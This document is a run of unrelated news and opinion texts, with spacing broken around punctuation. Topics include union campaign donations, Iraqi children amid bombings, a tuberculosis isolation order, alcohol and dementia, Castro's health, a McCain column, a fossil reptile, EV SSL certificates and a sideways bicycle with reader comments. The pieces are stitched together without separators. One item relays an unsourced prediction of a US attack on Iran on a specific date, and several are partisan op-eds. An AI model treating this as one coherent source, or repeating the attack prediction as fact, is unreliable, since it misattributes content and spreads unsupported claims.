The usual suspects are only used as scapegoats for the constant corruption that occurs year after year .
Liberal after liberal keeps screaming at oil companies and other major corporations .
As the right hand points at the financiers of the Republican Party with contempt , the left hand is handed its own wad of cash from corrupting organizations with their own agendas .
The whole debate of oil companies and Lockheed Martin contracts is only a distraction from the even bigger beguilers creeping around Congress .
The main groups behind these activities are labor unions .
The trap is set perfectly .
Make everyone hate business .
Talk about lobbyists and special interest groups .
Scream " Corporation ! Corporation ! Corporation ! " while secretly influencing politics more than the blatant poster boys of campaign financing .
The American people willingly fall into this snare every time .
Let ’s take a look at some of these coercive unions .
The Center for Responsive Politics organizes campaign financing in an easy readable format .
Their list of the top 100 major donors since 1989 quickly shows the reality of special interest groups which is far from the all too popular dejections against the oil boys .
Here are the labor unions with their rankings :
American Federation of State , County , & Municipal Employees ( #1 )
National Education Association ( #4 )
International Brotherhood of Electrical Workers ( #6 )
Laborers Union ( #7 )
Service Employees International Union ( #9 )
Carpenters and Joiners Union ( #10 )
Teamsters Union ( # 12 )
Communications Workers of America ( #13 )
United Auto Workers ( # 14 )
Machinists & Aerospace Workers Union ( #18 )
United Food and Commercial Workers Union ( #19 )
National Association of Letter Carriers ( # 26 )
AFL - CIO ( # 27 )
Sheet Metal Workers Union ( # 37 )
Plumbers & Pipefitters Union ( #45 )
International Association of Firefighters ( #50 )
United Steel Workers of America ( #51 )
Ironworkers Union ( #60 )
American Maritime Officers ( # 86 )
Seafarers International Union ( #93 )
Marine Engineers Beneficial Association ( #96 )
Six from the top ten major donors are labor unions !
Yet discussions around campaign financing do not regularly acknowledge these groups as culprits .
It ’s no wonder the United States is being infiltrated with Socialist and Communist ideas of redistribution .
Many of these labor unions were born in their beginnings with outright Marxist ideologies .
Their influence is spreading this agenda to this day .
The number one , American Federation of State , County , & Municipal Employees , holds itself as a major hypocrite .
Labor Unions in theory are supposed to use collective bargaining against exploitative money hungry corporations .
Their employer is not a corporation but the government .
The union throws in all this money to campaigns in order to see how much more they can steal from taxpayers .
Unions eventually kill the industries in which they are prevalent , but with a limitless supply of taxpayer money the lifeblood of this union flows at our expense .
They ’re not the only ones ; all of these unions are caught in a deep hypocrisy .
These " exploited " workers are always attempting to garner higher wages .
If their wages are so low , then how are they able to hire lobbyists with permanent positions in Washington with millions of dollars to bribe politicians ?
This hardly sounds like down - trodden exploited workers to me .
Now let ’s look at our earlier - mentioned poster boys and their rankings .
A good first look is at General Motors .
GM ranks 68th while the United Auto Workers 14th .
If these corporations have so much money to influence politics then why are the workers of General Motors giving more money than GM itself ?
The realities of finance are far from the anti-corporation and anti-business mentality spoon - fed to the American people on a daily basis .
Now for our poster boys :
Lockheed Martin ( #35 )
Chevron ( # 67 )
Exxon Mobil ( # 73 )
BP ( #100 )
* Halliburton the most demonized company around does n’t even make the top 100 list !
I ’m not attempting to pretend that this is the sole bribing that goes on in Congress , but this list does give a general idea of the some of the bigger donors .
If these companies are supposedly so influential , then the oil industry should not be so regulated .
If their influence is so huge , we would have plenty of new refineries as well as no taxes on gas .
However these restrictions and taxes do exist .
If I had the perceived omnipotent power of oil companies , I would not start a war in Iraq .
I would end the restrictions at home .
Simply ending gasoline taxes could yield higher profits than any war imaginable .
The accusations facing oil companies are not all - encompassing in their field .
The rich in general are constantly accused of controlling this country .
But once again we must ask , " If they run this country why do they pay 40 % income tax ; why does the top 50 % pay about 97 % of the taxes to fund everything in this country ? "
It hardly seems with these numbers that the rich are controlling America in their favor .
Labor unions play a huge underestimated roll in America .
Socialist policies like universal healthcare did not become platforms for the Democratic Party out of thin air .
Someone with money and influence has been pushing these long - run disastrous policies ; that someone is the labor unions .
I dislike everyone on this top 100 list .
But , if we ’re going to have a serious discussion regarding special interest groups in Washington D.C. , we need to tell the full story .
I hate the devil , but I do harbor a slight sympathy for the devil when other demons are running wild and destroying freedom without anyone noticing .
The finger pointing needs to point out the deception in every special interest group , not just a few major corporations .
The Iraq War has blinded many wise , common sense people from seeing the atrocities at home .
The Democrats through their labor union funding are just as corrupt and controlled as Republicans .
Let ’s not single out a few and attack them .
Let ’s attack the institution of lobbying on every level and have sympathy for no devil .
The Best of Vedran Vuk
Thirteen - year - old Mohammed Khalaf and his younger brother Ahmed had taken a break from their soccer game to collect candy from American soldiers when a suicide bomber turned his SUV onto the boys ’ narrow street .
Tires screeching , the vehicle sped toward the children at the end of the block .
In an instant , there was a massive explosion and 28 people were dead .
Among them was Ahmed , whose body was ripped open in front of his older brother .
Mohammed has n’t recovered since that terrible July morning , said his father , Ali Dalil Khalaf , putting a protective arm around the silent boy with large , searching brown eyes .
“ What can I tell him ? ” Khalaf said as he sat with his family on the concrete floor of their small living room .

Mohammed has become another young witness to the daily violence , and his father another adult burdened with loss and the task of explaining new horrors and hatreds to the children of Iraq .
Across the capital , parents , teachers and others now speak of protecting children not just from bombs , but from the war games youngsters play on the streets and the prejudices stoked by the mounting sectarian violence .
Adults wish they could heal the psychological scars of growing up in a place where every passing car could be lethal .
“ It ’s a hard time to be a parent , ” said Fawzi Haloob Sahi , who lives across the street from the Khalafs in the largely poor , Shiite Muslim neighborhood known as Jadida .
He lost his 17 - year - old son in the bombing and has no money to treat his youngest boy , whose right hand was mangled in the attack .
Raising children in Baghdad has n’t been easy for a long time .
For a dozen years leading up to the 2003 U.S. - led invasion , families struggled to eke out a living as the country buckled under the weight of United Nations sanctions .

Before that , hundreds of thousands of young Iraqis lost their lives in Saddam Hussein ’s bloody war with Iran and his invasion of Kuwait .
But since the fall of Hussein 2 1/ 2 years ago , the bombings , the executions and the rising sectarian tensions have exacted a new toll , many Iraqis say .
“ Children are not living their childhood , ” said Suat Mohammed , a psychology professor .
“ Children are growing afraid to interact with other children .
They are afraid of relationships , ” Mohammed said .
“ This generation , when it grows up , will create an unstable , weak society .... [ They ] will curse us for what we have wrought in Iraq . ”

At Al Huda School in Karada , a mostly Shiite neighborhood of Baghdad , Principal Najiha Mahdi Mohammed Hadi said she was seeing things she had never seen in her 32 years at the secondary school for girls .
Hadi said students had begun talking about who was a Shiite and who was a Sunni .
This year , there have been several fights between girls from different religious sects , she said .
“ We never thought of distinctions before , ” the 60 - year - old principal said , shaking her head sadly in her sweltering first - floor office .
“ This idea just appeared . ”
Outside , in a hallway where a group of girls was catching up on chemistry because it was too hot to study in the classrooms , teacher Suad Makiya vented her frustration at the persistent talk among Iraqis about the forces dividing them .

“ Why do they always talk of sectarian differences ? ” she said bitterly , insisting that there were no tensions among her students .
A few yards away , under the shade of an oleander bush , 17 - year - old Nawras Salah said she and other Sunnis did not distinguish between religious sects .
“ But Shiites do , ” Nawras said .
“ They talk about us not going to the Muslim holy sites and complain because Saddam was a Sunni . ”
Hadi and other teachers at the dilapidated schoolhouse off one of Baghdad ’s main boulevards say they have tried to quash the prejudices by stressing tolerance and unity .
The school held several special assemblies to discuss the issue , Hadi said .
“ Of course , it is something that breaks my heart , ” the tired - looking principal said in between interruptions from cleaning ladies who complained that there was no water to mop the floors .
“ But what can I do ?
I just hope that it will go away with time . ”

Across town in Baghdad ’s Sadr City neighborhood , a sprawling Shiite slum where mounds of garbage clog unpaved streets and sewage collects in foul - smelling ditches , Salima Juhaie ’s family clings to similar hopes .
In August , Juhaie ’s 15 - year - old daughter was trampled to death in a stampede of thousands of Shiite pilgrims who had come to worship at the shrine of an 8th century imam .
Juhaie and three of her other children barely escaped in the panic , sparked by rumors of an impending suicide attack .
Seated on a mat on her living room floor , Juhaie , cloaked in a black abaya , said she could n’t explain why her daughter died .
“ It is our fate , ” she whispered , her face puffy and red .
“ This is the Shiite way . ”
Juhaie ’s family and neighbors , gathered in the cramped home , said they were determined not to let the insurgents succeed in their effort to divide Iraqis .
Advertisement
“ This is the last card they have to play , ” said Mohammed Hassan , 58 , a Shiite Kurd who lives next door .
He said that in the narrow alley where they live , adults were reminding children what unites Iraqis .
“ This crisis has only brought us closer together , ” Hassan said .
Juhaie ’s 10 - year - old son , Mehdi , who was knocked unconscious in the stampede , ca n’t remember what happened .
But he has become more withdrawn since the tragedy and is having trouble sleeping , his family said .
For the children at the little house in Jadida , home to 14 members of the Khalaf family , the world has become a darker , smaller place since Ahmed ’s death .
On the living room wall , a photo of a smiling Ahmed in a soccer jersey has been tucked into the corner of a framed quotation from the prophet Muhammad .
On the front gate , the family has hung a black banner proclaiming Ahmed a martyr , in the Shiite tradition .
His brother Mohammed is not eating like he used to .

The parents no longer allow the children to go to the store to buy bread .
They saved money to buy video games so the children would n’t play soccer on the streets .
They keep the children away from the markets where vendors sell toy guns and knives .
They do n’t have to warn the children to avoid American soldiers .
Whenever a convoy passes on the nearby highway , the children flee to a back bedroom .
But Khalaf and the others say they cannot shield their children from everything .
“ When I see Americans , I show them what they are , ” Khalaf said .
“ But what can I do when it comes to terrorists ?
How can I identify them ?
They look just like us . ”

Khalaf ’s neighbor Sahi , who broke down in tears when he showed photos of his dead son , said he had told his youngest daughter that her brother was still in the hospital .
But , he said , the little girl is beginning to suspect the truth .
“ They are too young to understand , ” Khalaf said of the children .
“ It will all come out when they are older . ”

WASHINGTON ( Reuters ) - The United States has placed in isolation a man who may have exposed fellow passengers and crew on two May trans -Atlantic flights to a tuberculosis strain that is extremely hard to treat , officials said on Tuesday .
It was first time the U.S. government has issued such an isolation order since 1963 , when it took action against a smallpox patient , according to the U.S. Centers for Disease Control and Prevention .
The man , a U.S. citizen from the state of Georgia , is suffering from extensive drug - resistant TB , known as XDR TB , which resists virtually all antibiotics , the CDC said .
Tuberculosis is a bacterial infection that usually attacks the lungs .
CDC Director Dr. Julie Gerberding said authorities in the United States and other countries were trying to notify passengers who traveled on Air France flight 385 , arriving in Paris from Atlanta on May 13 , and on Czech Air flight 0104 , arriving in Montreal from Prague on May 24 .
Gerberding said health authorities were aware of the man ’s condition before he left the United States and warned him against traveling .
“ Under the circumstances , I think we were surprised that the patient had left the country , ” she said .
She said the man had “ compelling personal reasons ” to travel despite being ill .
“ I want to emphasize that from our perspective , no laws were broken here , ” Gerberding said .
The man returned to the United States by car .
He voluntarily entered a medical isolation facility in New York City on Friday before being flown on a CDC plane back to Atlanta on Monday .
Authorities called him “ relatively asymptomatic . ”
SOME PASSENGERS AT RISK
Officials did not give the patient ’s name or age or say where he became infected .
Gerberding said he must remain isolated until public health officials deem him to be no longer infectious .
Tuberculosis kills about 1.6 million people annually , with the highest number in Africa .
It is spread through the air when infectious people cough , sneeze , talk or spit .
Some TB bacilli acquire the ability to beat most medications , requiring extra medical efforts that often are impossible in the developing nations where tuberculosis exacts its highest death toll .
“ This is an unusual TB organism , one that ’s very , very difficult to treat .
And we want to make sure that we have done everything we possibly can to identify people who could be at risk , ” Gerberding told a news conference .
The passengers most likely to be at risk were those seated within two rows of the patient , Gerberding said .
She did not say how many passengers and crew were on the flights or how many countries had citizens aboard .
People who think they were on one of the affected flights should be tested for TB , the CDC said .
CDC said it was working with U.S. state and local health departments , ministries of health in other countries , the airline industry and the World Health Organization .
Dr. Kenneth Castro of the CDC ’s Division of Tuberculosis Elimination said that from 1993 to 2006 CDC knew of 49 people in the United States with XDR TB .
XDR TB requires 18 months to two years of treatment with a mixture of four to six drugs .
The treatment can often require surgery , as well , and can cost $ 500,000 per patient .
XDR TB is resistant to first - line antibiotics , and to an entire class of antibiotics called fluoroquinolones , as well as to at least one of three injectable drugs .
Air France - KLM said it is “ cooperating fully with all authorities involved . ”
According to new research one alcoholic drink a day could slow the progression of dementia in older people .
The results of a study by researchers at the University of Bari , Italy , which involved 1,445 people , aged 65 to 84 , suggests that those patients who drank one alcoholic drink a day developed dementia including Alzheimer 's disease , at a slower rate than people who never drank alcohol .
Of the group 121 had mild cognitive impairment which is the stage between normal ageing and dementia ; symptoms include mild memory or mental problems but no significant disability .
The researchers measured the alcohol consumption and brain functioning and discovered that in those patients who drank one alcoholic drink a day , usually a glass of wine , the rate dementia developed was 85 per cent slower than for people who never drank alcohol .
The researchers say the study is the first to look at how drinking alcohol affects the rate of progression to dementia and they suggest that the development of dementia could be slowed during the early stages of dementia .
The study participants were part of the Italian Longitudinal Study on Ageing and were tracked for three and a half years by which time the researchers saw a trend linked to drinking alcohol .
Dr. Vincenzo Solfrizzi and Dr. Francesco Panzafrom the University 's department of geriatrics , say it is unclear how low alcohol consumption appears to protect against the progression of dementia but suggest it is possible that alcohol may guard against dementia because it is good for the circulation and may stop hardening of the arteries in the brain .
Dr. Solfrizzi says their findings support other research which indicates that drinking moderate amounts of alcohol may protect the brain from stroke and vascular dementia .
Experts however , while they acknowledge the possible benefits of moderate alcohol consumption in relation to dementia , caution against people interpreting the research to mean they should drink more alcohol to protect themselves ; they urge people to adopt a healthy lifestyle with a healthy diet , physical exercise , mental stimulation , along with social interaction , in order to protect against dementia .
Alzheimer 's organisations are reportedly investigating the possible links between the effects of foods such as fruit juice , red wine and oily fish and the incidence of mental illness .
Experts have already proved that wine contains high levels of flavonoids , natural compounds which have an antioxidant effect , which are good for the circulation .
Experts have also been warning for some time that health and social services could be overwhelmed in the future by the vast numbers of people expected to develop dementia .
They say the study is interesting because it examines the link between people already experiencing mild cognitive impairment and the impact of drinking alcohol , and state that the message is " little and often " for people wanting to protect their memory - as high levels of alcohol consumption can also lead to dementia .
Previous research from the French wine region of Bordeaux has shown that people with the highest consumption of red wine reduced their risk of dementia by 45 per cent .
The study published in the journal Neurology .
A stronger Mr Castro appeared defiant on a recent video
He was heard speaking live on the daily radio programme of his ally , the Venezuelan President Hugo Chavez .
The 80 - year - old leader is believed to be suffering from diverticulitis , a weakening of the walls of the colon .
He said he was " gaining ground " , adding he felt he had more " energy and more strength " .
He was last seen in a video recording released in early February .
Mr Castro 's younger brother , Raul , has been acting as Cuban president since July .
' Student again '
" Hello there , illustrious and dear friend , how are you ? "
Fidel Castro asked President Chavez at the start of an extended conversation broadcast on the Venezuelan leader 's Hello President show .
" I feel good and I 'm happy , " Mr Castro said .
He said his illness had given him more time for reading , joking that he had become a student again .
He did not discuss the question of when , or if , he would be returning to power , instead calling for patience from people expecting daily updates on his condition .
" I can't talk every day .
I ask everyone for patience , calm ... the country is marching along , which is what is important , " he said .
The leaders chatted about current events , with Mr Castro saying Tuesday 's stock market slump in China and the US " really proves our ideas " .
They ended their conversation proclaiming : " We will prevail . "
Hospital visits
Mr Chavez has visited the convalescing Cuban leader several times , most recently in January .
Video of their meetings have been released .
Mr Castro's health is treated as a state secret in Cuba , and has been the subject of much speculation both at home and overseas .
The most regular pronouncements on his health have come from Mr Chavez .
Cuban authorities have denied the claims of US intelligence officials that he has terminal cancer but will only say that Mr Castro is recuperating satisfactorily .
In January , President Chavez denied a report in a Spanish newspaper that said Mr Castro 's prognosis was very grave after three failed operations .
A Spanish surgeon who travelled to Cuba at that time to examine Mr Castro also said the report was " without foundation " .

‘ THIS IS NOT Luke Skywalker here , ” said Sen. Lindsey Graham ( R - S.C. ) , discussing his friend and Senate colleague John McCain ’s second run for the presidency .
“ This is a totally different campaign . ”
Graham was looking for a way to reassure his fellow conservatives that they no longer had anything to fear from McCain .
His choice of metaphor is one of those windows into the fundamental cultural gap that separates hard - core conservatives from the rest of humanity .
To most people , who think of Luke Skywalker as a hero battling an evil and immensely powerful empire , Graham ’s implication would be seen as an unmitigated insult .
In the world of the GOP elite , though , it ’s a form of praise : No , no , do n’t worry , McCain ’s with the empire now .
Seven years ago , of course , McCain was likening himself in public to Luke Skywalker , waving light sabers on stage at rallies and comparing his party ’s establishment to the Death Star .
He would say such things as , “ My party has become captive to special interests . ”
He would cite a bumper sticker that read “ The Christian Right Is Neither . ”
And now ?
Well , let ’s just say that if John McCain circa 2007 was campaigning against John McCain circa 2000 , he would call him a communist .
The old McCain called President Bush ’s tax cuts fiscally and socially irresponsible , a giveaway to the rich in a time of rising inequality .
The new McCain was recently interviewed by National Review ’s Ramesh Ponnuru and asked if there were any circumstances , including the guarantee of spending cuts , under which he ’d consider repealing the tax cuts he denounced and voted against .
He replied : “ No. None .
None .
Tax cuts , starting with Kennedy , as we all know , increase revenues . ”

We all know that ?
In fact , economists know that this is not true .
Conservative economists know this is n’t true .
Even conservative economists who work in the Bush administration have admitted this is n’t true .
As former Bush economist Alan Viard , now at the conservative American Enterprise Institute , said : “ Federal revenue is lower today than it would have been without the tax cuts .
There ’s really no dispute among economists about that . ”
How does McCain explain his conversion to voodoo economics ?
He does n’t .
He says things like : “ I have n’t changed .
My record is the same on all issues , which is that of a conservative Republican . ”
Which is funny , because a few years ago one of his close advisors -- someone who is now furiously insisting that McCain has always been a staunch conservative -- told me , “ Ideologically , we all changed . ”
Now watch him madly pander .
In the same interview , Ponnuru asked McCain about cloning :
“ Sen. McCain : I ’m obviously against any human cloning .
Obviously .
Advertisement
“ Ponnuru : Would you be willing to ban it ?
“ Sen. McCain : Sure .
“ Ponnuru :
So you ’d support something like the Brownback bill ?
“ Sen. McCain : Yes .
I think I ’m a cosponsor . ”
Advertisement
At this point in the interview , his advisor interjected to say , “ I ’ll double - check that . ”
It turned out McCain was not a cosponsor .
His casual language about a matter of the deepest philosophical weight -- Ban it ?
Sure ! -- suggests he knows little about the bill except that supporting it would help him win the nomination .
What makes McCain ’s conversion all the more tragic is that it ’s plainly not working .
He has spent the last three years plotting to make himself the candidate of the GOP establishment that he once attacked .
But , as the Wall Street Journal reported , “ 2008 is shaping up as the worst presidential year in three decades to be the candidate of the Republican establishment . ”
His career since then has indeed resembled a certain famous Jedi .
He began as a crusader for justice .
Soon he realized that he needed to acquire more power in order to accomplish his noble goals .
But over time , his pursuit of power became the goal itself , and by the end he lost his capacity to differentiate between right and wrong .
This is not Luke Skywalker here .
This is Luke Skywalker ’s father .
But at least Darth Vader attained his position before the Death Star exploded .
The reptile was unearthed in rocks from northeastern China
The abnormal animal , belonging to a group of aquatic reptiles , was unearthed in northeastern China and dates to the time of the dinosaurs .
The specimen reveals that it must have been very young when it died and became fossilised , says lead researcher Eric Buffetaut .
Details of the fossil appear in the UK Royal Society journal Biology Letters .
This animal was a choristoderan , an extinct reptile that reached a length of one metre in adulthood and was characterised by a long neck - two in this case .
The animal 's spinal column divided in two at the point where the neck emerges from the body .
This formed two long necks that ended in two skulls .
Choristoderans seem to have been common aquatic reptiles during the Cretaceous Period ( 144 to 65 million years ago ) in what is now northeastern China .
" To my knowledge , it is the only record of a vertebrate fossil showing that kind of malformation , " Dr Buffetaut , director of research at the Centre National de la Recherche Scientifique ( CNRS ) in Paris , France told BBC News .
More than 400 two - headed snakes have been recorded
Two - headed snake
" So the chances of finding a fossil like this are extremely low . "
The abnormality is known to occur with some frequency in modern reptiles ; about 400 cases of two - headed snakes have been recorded in historic times .
It is thought this can occur as a result of injury to an embryo .
The specimen comes from Cretaceous rocks in the Yixian Formation of northeastern China .
It is now held at the Shenzhen Museum in southern China .

The CA / Browser Forum wants to bring increased safety to web banking and e-commerce by developing a new digital certificate that can better verify a site 's legitimacy .
The technology is already included in Internet Explorer 7 and Opera 8 and certainly looks like a step in the right direction — for the companies that are able to get a certificate .
The Forum has developed guidelines for Extended Validation SSL certificates that are far more robust than traditional SSL certificates .
They will suddenly become much more important to consumers in January , when Microsoft begins using them with IE7 to verify that sites are safe to use .
A green address bar will alert consumers to the fact that the site is approved with an EV certificate , and the CA / Browser Forum has made sure that these are not simple to obtain .
That 's good news for sites that can get one , but not so good for small businesses , which generally cannot .
The draft guidelines ( PDF ) go into excruciating detail about what certificate authorities ( CAs ) like Thawte and RSA must do before issuing an EV certificate to a business .
To give only a single example , certificate authorities must ensure that the address they are given by the company is its actual place of business .
If the CA is unable to verify this using public records , it must send " a reliable individual " on a site visit to the address .
The visitor must look for a permanent sign , must note whether the building is a condo , office building , strip mall , etc. , look for evidence that ongoing business is taking place at the location , and must take photos of the exterior and the reception area .
Holy verification process , Batman !
The goal is to prevent common phishing scams in which a crook signs up for an SSL certificate using nothing more than a P.O. box and thereby gets the " padlock " icon for his site .
The new system is far more thorough , but because of the way that it works , many small businesses will be excluded .
They can still get an SSL certificate , but their sites wo n't get the green " safe " bar in IE7 and Opera .
Because of this , there has been some controversy over the specification , which remains in draft form .
It does not actively hurt businesses without an EV certificate , though , so Microsoft will start recognizing the certificates in January .
Opera already does so , and other browsers may soon follow suit .
Although it 's too bad that small businesses cannot currently be validated for EV certificates , the vast majority of phishing attacks involve large financial institutions or e-commerce sites .
Does anyone really worry that sallyshouseofcookies.com could become a phishing target ?
Small business owners are n't as concerned about the risk of a real phishing attack as they are about the perception that their sites are " unsafe " because they do n't have the green bar .
If the program gains widespread public acceptance and casual web users come to associate the green bar with a safety guarantee , this could prove detrimental to those sites that can't get a certificate .
The CA / Forum is aware of the issue , though , and will hopefully find a safe way to validate smaller vendors in the future .
Operation Bite : April 6 sneak attack by US forces against Iran planned , Russian military sources warn
By Webster G. Tarpley – Online Journal Contributing Writer – Mar 26 , 2007
WASHINGTON DC , — The long awaited US military attack on Iran is now on track for the first week of April , specifically for 4 am on April 6 , the Good Friday opening of Easter weekend , writes the well - known Russian journalist Andrei Uglanov in the Moscow weekly “ Argumenty Nedeli . ”
Uglanov cites Russian military experts close to the Russian General Staff for his account .
[…]
Observers comment that this dispatch represents a high - level orchestrated leak from the Kremlin , in effect a war warning , which draws on the formidable resources of the Russian intelligence services , and which deserves to be taken with the utmost seriousness by pro-peace forces around the world .

When people worry about the effects of global warming , they worry more about hurricanes than anything else .
In surveys , almost three - quarters of Americans say there will be more and stronger hurricanes in a warming world .
By contrast , fewer than one - quarter worry about increased coastal flooding .
But as far as the scientific consensus is concerned , people have things just about backward .
There is no doubt that as the world warms , seas will rise , increasing the flood risk , simply because warmer water occupies more space .
( And if the Greenland or Antarctic ice sheets melt , the rise will be far greater . )
It seems similarly logical that as the world warms , hurricanes will be more frequent or more powerful or both .
After all , they draw their strength from warm ocean waters .
But while many scientists hold this view , there is far less consensus , in part because of new findings on other factors that may work against stronger , more frequent storms .
“ Global warming is as real as it gets , ” Richard A. Anthes , president of the University Corporation for Atmospheric Research , said last month at a weather conference in the Bahamas , where most of the conversation focused on hurricanes .
But as for its link to hurricanes , Mr. Anthes said , “ I do n’t think it ’s been proved conclusively . ”
Neil Cavuto , Fox 's " money guy " ( his words ) is at times , as regular readers of this site know , very adept at creating the illusion that his show is about " business news " while simultaneously beating the propaganda drums for the Bush administration .
Today he was at the top of his game .
With the help of cohort Brenda Buttner , he blew out some smoke and flashed some mirrors and he put the fear of losing money into his audience due to the " witch hunt " the Democrats are conducting over the Attorney General scandal .
( Oops !
There must have been a typo in the memo to Cavuto .
Bush called it a " partisan fishing expedition . " )
At roughly the bottom of the hour , Cavuto returned from a break with the second of two FOX NEWS ALERTs about George Bush making live remarks today at 5:45 p.m. EDT about the Gonzales " mess . "
Cavuto said Bush is , " expected to express his support for Attorney General Gonzales but many fear this will only add fuel to what is being called a witch hunt , in a lot of circles , and that 's got the attention of Wall Street .
Some are concerned this could all spill over into a stock market sell off .
Now , we did not see that today ; the fear is that we might . "
Cavuto turned to Buttner , Fox 's " senior business correspondent , " who elaborated :
Yeah , I think this could be a big problem .
Look first there 's the drama of Gonzales stays , or he goes .
Whatever happens Bush will be painted as either weak or as intransigent .
Next we have these hearings that could go on forever and just drag out everything .
Bottom line , the Dems are not , are just not satisfied with the legislative body .
They want to erode the presidential powers and I think that 's a real danger and that 's what Wall Street is focused on .
Comment : According to Fox , life is very , very scary , yes , but it's also very , very simple .

Its key advantage is that it's more manoeuvrable than a conventional bike , says its inventor Michael Killian , 46 , a software engineer in Dublin .

A regular feature in the BBC News Magazine - aiming to answer some of the questions behind the headlines
" The strange thing about it is it 's very like snowboarding or sailing because you 're moving sideways and operating on a different balance system in your head .
" It 's a front - to - back balance not a left - to - right like a normal bike .
That affords you tremendous grace and motion .
It 's dance - like .
" The advantages are in the motion .
It 's never going to win you the Tour de France .
But it 's mesmerising and entertaining . "
1 : The back cog drives the back wheel chain , which unlike on a normal bike can turn either way when the back handlebar is steered .
2 : Back handlebar which steers the back wheel and has a rear light .
3 : Front handlebar which steers the front wheel and has a light and rear - view mirror .
4 : Pedals are at right angles to the wheels .
5 : The seat is shaped like an upside - down crescent .
6 : This frame goes over the lap of the cyclist , but can go under if preferred .
A modified version , which has two sets of handlebars , smaller wheels and upon which the cyclist faces forward , could be in the shops at Christmas priced at £ 150 , if negotiations with a supplier in Taiwan prove fruitful .
And Mr Killian hopes the Sideways Bike will follow it into mass production .
He has already taken it to Paris , Amsterdam , Cologne , New York and Boston , to test it on the streets .
Riding it around the Arc de Triomphe was a particular challenge , he says , which drew looks of bemusement from Parisiens .
But the Sideways Bike would need amending before riding on the UK streets because riding the current model would mean the cyclist had his back to the traffic .
" It 's a kids ' bike , from seven up to teenagers .
Some adults will like it but it's for play and you need to be co-ordinated enough to ride it . "
The younger brother of the Sideways Bike .
Yours for £ 150
After testing it on volunteers , he estimates only about six out of 10 people are able to master it .
And he recommends getting a cyclist 's helmet with a rear - view mirror attached .
A motion Mr Killian much enjoys is " drifting " , which is when both wheels are parallel .
The biggest difference to a normal bike is in turning , which is usually done using both wheels .
A left - hand corner , for instance , will be approached with a move to the right , as it would on a normal bike .
Then the cyclist leans into the turn to take the corner .
The front wheel is usually the first to turn and the back wheel follows to modify the angle .
He had the idea four years ago , while spending his Saturdays in his shed " working on nonsense " .
" The first prototype nearly killed me and I still have a scar on my leg .
I took it to a slope and went 330 m downhill .
" That was the Eureka moment and it felt like picking up a glove and finding that it fits perfectly .
It was a wonderful feeling . "
But what 's the point ?
If it is n't particularly safe , fast , or useable what real point has it got ?
Surely designing a bike that , ( like Roland Carter pointed out , has serious flaws when turning because not being able to see traffic ) is for children , is a major mistake !
They are the age group most likely to be injured whilst ' having fun ' !
Keith Smith , Leeds UK
150 years of development of the current bike has given us ultra lightweight , fast , full suspension bikes made from steel , aluminium and even carbon fibre .
These bikes work brilliantly , hence making this sideways bike a totally pointless exercise .
This story will the first and last time we ever hear about this ridiculous machine .
Iain Pendry , Derby
I am ultra cautious when I ride a normal bike in today 's traffic so I wo n't be buying one of these .
I am sure it will go down in history as another good but well engineered Irish joke

You boring people !!!
This is how great ideas come about !
People have to be innovative to move ahead , even is some of the ideas are a little daft !
Have a sense of humour for goodness sake .
In a world like ours we need it and good on the BBC for talking about it .
Made me chuckle at least !
Nick Rennie , Austria , Vienna
I crashed my ( ordinary ) bicycle into the front of a car this morning , luckily without injury .
Maybe its time to invest , except I dread to think what would happen in a crash situation as you would n't be able to navigate so easily as you cartwheeled through the air , whereas a neat somersault over the front got me out of trouble ...
Anon , Liverpool , England
Is it just me or is this completely useless ?!
Surely a great invention is something that improves our way of life not taking an existing object and making it less functional ?
I think it should be sold with neck strain cream too .
Strange !
Keely Jackman , London
It 's a shame that all of the responses so far to this invention are negative .
It is true that much practical detail remains to be solved and that modern traffic situations , tricky for any cyclist , would be more dangerous for the sideways bike - as it stands .
It is also not clear how well the sideways bike would cope with steep hills .
But not all cycling is about city transportation .
Much of it is for health and for pleasure .
The conventional diamond - framed bike , however evolved , remains uncomfortable for many ( in particular causing lumbar problems in many ) .
If the sensation of riding one of these machines really is as pleasurable as is described - affording ' grace and motion ' , being ' dance - like ' - then this is surely a valid contribution to the world of two - wheeled transport .
And to attract people to green transport requires a degree of enchantment and attraction !
Loosen up a bit , everyone !
OK , do n't try it round the Arc de Triomphe like Mr Killian did .
And at £ 150 even I could afford one - more than can be said for a decent conventional bike .

It may not be practical as currently designed but can still serve as a starting point for other bicycle redesigns .
How about automating the rear steering to keep the maneuverability advantage while removing most of the learning curve ?

If 6 out of 10 folk can master it , does that mean 4 out of 10 bike thieves will be out of a job ?

I did n't realise that bicycles were so unmanoeuvrable that they needed redesigning .
Dean , Devon , UK
Fun I suppose but otherwise utterly pointless and dangerous !
How do you put your foot down if you overbalance to the right ( or back in this case ) ?
Take a look in Cambridge at the number of people who have n't yet mastered riding an ordinary bike safely or within the law !
Richard Bagnall , UK , Cambridge
You boring , boring people .
This was clearly invented as a bit of fun .
I 'm absolutely convinced when Skateboards and In - Line skates , and similar methods of transport were invented ; people like you lot said much the same thing .
Lot 's of recreational activities are neither fast , or safe , yet their point is to have fun .
I would imagine a person who places the words having fun in quotes is clearly unused to the idea of enjoyment .
Peter Fealey , Weston - super - Mare
Whilst this is a fun invention , I find it irritating that toys like this get so much attention in the main stream media .
It adds nothing to the promotion of cycling as a practical method of travelling from A to B and sends out the message that cycling is for cranks and eccentrics .
( Even the word crank .. )
Ralph Williams , Cambridge UK
As we say in the Big Apple , fuhgeddaboudit !
Riding this contraption on the street in Manhattan means you 'll never see the car doors open behind you as you travel up the avenue ( what we affectionately call being " doored " ) , you 'll never see the pedestrian jaywalkers as they step out from behind a parked car , and when you get cut off by a vehicle ( which the bus drivers love to do ) and fall backwards your goose is cooked !

It 's a silly design , which is why he 's marketing this as a kids ' bike .
You can't carry any panniers , there are no baskets , and you certainly can't tow anything .
This takes a practical machine and reduces it to a nonsensical toy .
Nancy , New York USA
If I ever feel the need to seriously injure myself , I 'll remember this invention .
You mention how a left hand corner can be approached , but how will you be able to check for traffic coming from behind ?
Presumably with those eyes we all have in the back of our heads !
Like to see this one get money from the Dragons ' Den !!
Roland Carter , Birmingham
When von Drais first invented it , the bike was just a wooden frame on two wheels and a steering , and the rider had to push it with his feet ...
It was received a huge " laughing stock " and everybody was saying that " it would only remain a joke " ...
Doest it look familiar ?
What 's the human mind without sparkles ?
Dorin , Brasov , Romania
I agree that the bike does n't sound as safe or practical as an ordinary bike .
But there are other advantages a bike might have - it sounds as though riding this in general is an interesting and pleasant experience .
Perhaps it would n't be much use on the road but to get around quiet , open spaces - perhaps simply as a leisure pursuit in itself - it sounds like it might be quite fun .
Why does everybody feel the need to attack something so virulently that they do n't even know much about ?
ps. I 'm not the inventor , honest .

Six soldiers , journalist die in roadside bombing
